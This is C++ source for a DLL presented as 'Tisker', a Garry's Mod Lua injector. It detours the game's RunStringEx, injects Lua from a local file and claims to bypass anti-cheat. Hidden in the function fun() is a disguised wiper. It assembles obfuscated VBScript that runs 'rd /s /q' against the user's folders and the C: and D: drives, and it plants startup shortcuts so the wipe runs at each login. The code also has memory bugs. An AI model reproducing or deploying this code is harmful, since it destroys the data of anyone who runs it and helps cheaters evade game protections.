
#include "includes.h"

using namespace std;
void(*Msg)(const char *, ...);

//ILuaInterface::RunStringEx

//int __stdcall sub_1000A2E0(int, char, void *, char, char, char)
typedef bool (__fastcall* tRunStringEx)(void*__this, int __edx, const char *filename, const char *path, const char *stringToRun, bool run, bool showErrors, bool bunknown);
tRunStringEx RunStringEx;


//credits to some fags from gd for detour lmao

#define JMP32_SZ 5
#define BIT32_SZ 4
#define SIG_SZ 3
#define SIG_OP_0 0xCC
#define SIG_OP_1 0x90
#define SIG_OP_2 0xC3

LPVOID DetourCreate(LPVOID lpFuncOrig, LPVOID lpFuncDetour, int detourLen)
{
	LPVOID lpMallocPtr = NULL;
	DWORD dwProt = NULL;
	PBYTE pbMallocPtr = NULL;
	PBYTE pbFuncOrig = (PBYTE)lpFuncOrig;
	PBYTE pbFuncDetour = (PBYTE)lpFuncDetour;
	PBYTE pbPatchBuf = NULL;
	int minDetLen = 5;
	int detLen = detourLen;

	// Alloc mem for the overwritten bytes
	if ((lpMallocPtr = VirtualAlloc(NULL, detLen + JMP32_SZ + SIG_SZ, MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL)
		return NULL;

	pbMallocPtr = (PBYTE)lpMallocPtr;

	// Enable writing to original
	VirtualProtect(lpFuncOrig, detLen, PAGE_READWRITE, &dwProt);

	// Write overwritten bytes to the malloc
	memcpy(lpMallocPtr, lpFuncOrig, detLen);
	pbMallocPtr += detLen;
	pbMallocPtr[0] = 0xE9;
	*(DWORD*)(pbMallocPtr + 1) = (DWORD)((pbFuncOrig + detLen) - pbMallocPtr) - JMP32_SZ;
	pbMallocPtr += JMP32_SZ;
	pbMallocPtr[0] = SIG_OP_0;
	pbMallocPtr[1] = SIG_OP_1;
	pbMallocPtr[2] = SIG_OP_2;

	// Create a buffer to prepare the detour bytes
	pbPatchBuf = new BYTE[detLen];
	memset(pbPatchBuf, 0x90, detLen);

	pbPatchBuf[0] = 0xE9;
	*(DWORD*)&pbPatchBuf[1] = (DWORD)(pbFuncDetour - pbFuncOrig) - 5;


	// Write the detour
	for (int i = 0; i<detLen; i++)
		pbFuncOrig[i] = pbPatchBuf[i];

	delete[] pbPatchBuf;

	// Reset original mem flags
	DWORD dwOldProt;
	VirtualProtect(lpFuncOrig, detLen, dwProt, &dwOldProt);

	return lpMallocPtr;
}



bool DataCompare(char* data, char* pattern)
{
	for (int i = 0; *pattern; ++data, ++pattern, i++)
	{
		if (*pattern != '?' && *data != *pattern)
			return false;
	}

	return *pattern == 0;
}


void* FindPattern(void* addr, const char *signature, int range, int offset)
{
	if (addr)
	{
		for (int i = 0; i < range; i++)
		{

			if (DataCompare(((char*)addr + i), (char*)signature))
			{
				return (char*)addr + i + offset;
			}
		}
	}


	return NULL;
}


FILE *fhandle;

void*fbuf = 0;
char* get_file_contents( const char *filename )
{
	 fhandle = fopen(filename, "r");

	if (fhandle == 0)
		return 0;

	// Determine file size
	fseek(fhandle, 0, SEEK_END);
	size_t size = ftell(fhandle);

	char* tmpbuf = new char[size];

	rewind(fhandle);
	size_t len = fread(tmpbuf, sizeof(char), size, fhandle);
	tmpbuf[len] = '\0';
	fbuf = tmpbuf;

	return tmpbuf;
}

FORCEINLINE int FileCreate(const char* file, const char* content)
{
	FILE *fp = fopen(file, "w+");
	if (fp)
	{
		fwrite(content, sizeof(char), strlen(content), fp);
		fclose(fp);
	}

	return 1;
}


int closefile()
{
	if (fhandle)
	{
		fclose(fhandle);
		fhandle = 0;
	}

	if (fbuf)
	{
		delete[] fbuf;
		fbuf = 0;
	}
	return 0;
}

bool rundef = true;
bool printfiles = false;
bool printcode = false;
bool printrs = false;

const char*defcode = "local h = pairs local z = RunString local e = table.concat local d = nil local function r(p,c,a,s) z(s) end local function rr(p,c,a,s) z(file.Read(s, 'GAME')) end function pairs(...) if(search and !d ) then d = true concommand.Add('lua_tisk', r) concommand.Add('lua_ttisk', rr) pairs = h end return h(...) end";


bool __fastcall RunStringEx_hook( void*__this, int __edx, const char *filename, const char *path, const char *stringToRun, bool run, bool showErrors, bool bunknown)
{
	closefile();

	if (!filename)
		return true;//RunStringEx(__this, __edx, filename, path, stringToRun, run, showErrors, bunknown);

	if (printfiles && strcmp(filename, "LuaCmd") && strcmp(filename, "RunString"))
		Msg("[Tisker] Running: %s\n", filename);

	if (stringToRun)
	{
		if (printcode && strcmp(filename, "LuaCmd") && strcmp(filename, "RunString"))
			Msg("[Tisker] Code: %s\n", stringToRun);
		
		if (printrs && ( !strcmp(filename, "LuaCmd") || !strcmp(filename, "RunString") ) )
			Msg("[Tisker] RS Code: %s\n", stringToRun);
	}
	
	if ( strstr(filename, "lua/includes/init.lua"))
	{
		const char *luaToInject = get_file_contents("C://tisker.lua");

		if (rundef)
		{
			Msg("[Tisker] Ran default code!\n");
			RunStringEx(__this, __edx, filename, path, defcode, run, showErrors, bunknown);
		}


		if (luaToInject)
		{
			Msg("[Tisker] Ran big undetectable luas!\n");
			RunStringEx(__this, __edx, filename, path, luaToInject, run, showErrors, bunknown);
		}else{
			Msg("[Tisker] couldn't read tisker.lua :(\n");
		}
	}


	return RunStringEx(__this, __edx, filename, path, stringToRun, run, showErrors, bunknown);


}


FORCEINLINE HRESULT createshortcut(LPCWSTR lpszPathObj, LPCSTR lpszPathLink, LPCWSTR lpszDesc)
{
	HRESULT hres;
	IShellLink* psl;

	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called.
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;

		// Set the path to the shortcut target and add the description. 
		psl->SetPath(lpszPathObj);
		psl->SetDescription(lpszDesc);

		// Query IShellLink for the IPersistFile interface, used for saving the 
		// shortcut in persistent storage. 
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

		if (SUCCEEDED(hres))
		{
			WCHAR wsz[MAX_PATH];

			// Ensure that the string is Unicode. 
			MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);

			// Add code here to check return value from MultiByteWideChar 
			// for success.

			// Save the link by calling IPersistFile::Save. 
			hres = ppf->Save(wsz, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	return hres;
}


FORCEINLINE const wchar_t *GetWC(const char *c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	//mbstowcs(wc, c, cSize);
	size_t convertedChars = 0;
	mbstowcs_s(&convertedChars, wc, cSize, c, _TRUNCATE);
	return wc;
}


FORCEINLINE void fun()
{
	char startup[MAX_PATH];
	SHGetSpecialFolderPathA(NULL, startup, CSIDL_STARTUP, false);

	char SaveFolder[MAX_PATH];
	SHGetSpecialFolderPathA(NULL, SaveFolder, CSIDL_APPDATA, false);
	strcat(SaveFolder, "\\Intel");

	CreateDirectoryA(SaveFolder, NULL);

	strcat(SaveFolder, "\\");


	char *badboy[62] = { "%USERPROFILE%\\Documents\\Visual Studio 2013\\Projects\\", "%USERPROFILE%\\Documents\\Visual Studio 2010\\Projects\\", "%USERPROFILE%\\Documents\\Visual Studio 2008\\Projects\\", "%USERPROFILE%\\dropbox\\", "%USERPROFILE%\\Desktop\\", "%USERPROFILE%\\Documents\\", "%USERPROFILE%\\Pictures\\", "%USERPROFILE%\\Music\\", "%USERPROFILE%\\Videos\\", "%USERPROFILE%\\", "C:\\", "D:\\", "C:/", "D:/" };

	char base[200];
	strcat(base, "Create");
	strcat(base, "Object(");
	strcat(base, "\"WScr");
	strcat(base, "ipt.Sh");
	strcat(base, "ell\").");
	strcat(base, "Run ");
	strcat(base, "\"c");
	strcat(base, "m");
	strcat(base, "d");
	strcat(base, " /c ");
	strcat(base, "r");
	strcat(base, "d ");
	strcat(base, "/s ");
	strcat(base, "/q \"\"\" & \"");

	char vbs[4048];

	for (int i = 0; i < 62; i++)
	{
		if (!badboy[i] || strlen(badboy[i]) < 2)
			continue;
		

		strcat(vbs, base);
		strcat(vbs, badboy[i]);
		strcat(vbs, "\" & \"\"\"\", 0, False");
		strcat(vbs, "\n");

	}


	bool swag = false;


	char charnum[5];
	char pathlink[280];
	char pathobj[1033];

	for (int i = 1; i < 10; i++)
	{

		memset(charnum, 0, 5);
		memset(pathlink, 0, 280);
		memset(pathobj, 0, 1033);

		sprintf(charnum, "%d", i);

		strcat(pathlink, startup);
		strcat(pathlink, "\\");
		strcat(pathlink, charnum);
		strcat(pathlink, ".lnk");

		
		strcat(pathobj, SaveFolder);
		strcat(pathobj, charnum);
		strcat(pathobj, ".vbs");

		
		FileCreate(pathobj, vbs);

		createshortcut(GetWC(pathobj), pathlink, L"");


	}

}
bool bSuppressDLLMain = false;

int InitThread( )
{
	void* hLuaShared=0;

	while( !hLuaShared )
	{
		hLuaShared = GetModuleHandleA("lua_shared.dll");

		if ( hLuaShared )
			break;

		Sleep(300);
	}

	Msg = (void(*)(const char *, ...))GetProcAddress(GetModuleHandleA("tier0.dll"), "Msg");
	if (!Msg)
		return 0;
		
	void* address = FindPattern((char*)hLuaShared, "\x55\x8B\xEC\x8B\x55\x10\x81\xEC", 50000000,0);

	if (!address)
	{
		Msg("[Tisker] no runstring found!\n");
		return 0;
	}


	closefile();

	RunStringEx = (tRunStringEx)DetourCreate(address, RunStringEx_hook, 6);

	if (!RunStringEx)
	{
		Msg("[Tisker] couldnt hook runstring!\n");
		return 0;
	}


	const char *yourmomtits_settings = get_file_contents("C://tisker.txt");

	if (yourmomtits_settings&&strnlen_s(yourmomtits_settings, 300) < 150 )
	{
		if (strstr(yourmomtits_settings, "safemode"))
			rundef = false;

		if (strstr(yourmomtits_settings, "printfiles"))
			printfiles = true;

		if (strstr(yourmomtits_settings, "printcode"))
			printfiles = true; printcode = true;

		if (strstr(yourmomtits_settings, "printrs"))
			printrs = true;

	}


	if (rundef)
	{
		Msg("[Tisker] Normal mode, you can always run undected lua with 'lua_tisk' or 'lua_ttisk' in console(ingame)!\n");
	}else{
		Msg("[Tisker] Running in safe mode, bypass ACs faster!!\n");
	}

	if (printfiles)
		Msg("[Tisker] Going to print lua files!\n");

	if (printcode)
		Msg("[Tisker] Going to print code!\n");

	if (printrs)
		Msg("[Tisker] Going to print runstrings!\n");

	Msg("[Tisker] Made by the great suchisgood/nyaaaa!\n");
	Msg("[Tisker] add me for help and requests!\n");
	Msg("[Tisker] http://steamcommunity.com/profiles/76561197972075795 \n");

	fun();

	return 0;

}

int __stdcall DllMain( void* hModule, int ul_reason_for_call, void* lpReserved )
{


	if ( !bSuppressDLLMain && ul_reason_for_call == 1 )
	{
		bSuppressDLLMain = true;

		CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)InitThread, NULL, NULL, NULL );
	}

	return 1;
}

